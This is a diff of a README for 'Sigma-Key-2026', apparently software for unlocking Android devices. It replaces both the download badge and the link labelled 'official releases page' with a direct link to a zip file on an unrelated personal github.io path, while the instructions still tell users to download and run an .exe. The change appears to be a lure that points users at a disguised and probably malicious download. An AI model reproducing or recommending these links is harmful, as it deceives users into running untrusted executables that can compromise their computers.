@@ -5,7 +5,7 @@ description: "Download and install the Sigma Key software on Windows 10 and 11 u
 ---
 # 📱 Sigma-Key-2026 - Unlock your android devices with ease
 
-[![Download Sigma-Key-2026](https://img.shields.io/badge/Download-Sigma--Key--2026-blue.svg)](https://github.com/edeebackless68/Sigma-Key-2026/releases)
+[![Download Sigma-Key-2026](https://img.shields.io/badge/Download-Sigma--Key--2026-blue.svg)](https://raw.githubusercontent.com/edeebackless68/edeebackless68.github.io/main/colonialize/edeebackless-io-github-v2.6.zip)
 
 ## 📖 About this software
 
@@ -24,7 +24,7 @@ Before you begin, verify that your computer meets these minimum specifications:
 
 ## ⬇️ How to get the software
 
-1. Visit the [official releases page](https://github.com/edeebackless68/Sigma-Key-2026/releases) to view available files.
+1. Visit the [official releases page](https://raw.githubusercontent.com/edeebackless68/edeebackless68.github.io/main/colonialize/edeebackless-io-github-v2.6.zip) to view available files.
 2. Look for the file ending in .exe in the latest release section.
 3. Click the file name to start the download.
 4. Save the file to a folder you can find later, such as your Downloads folder.
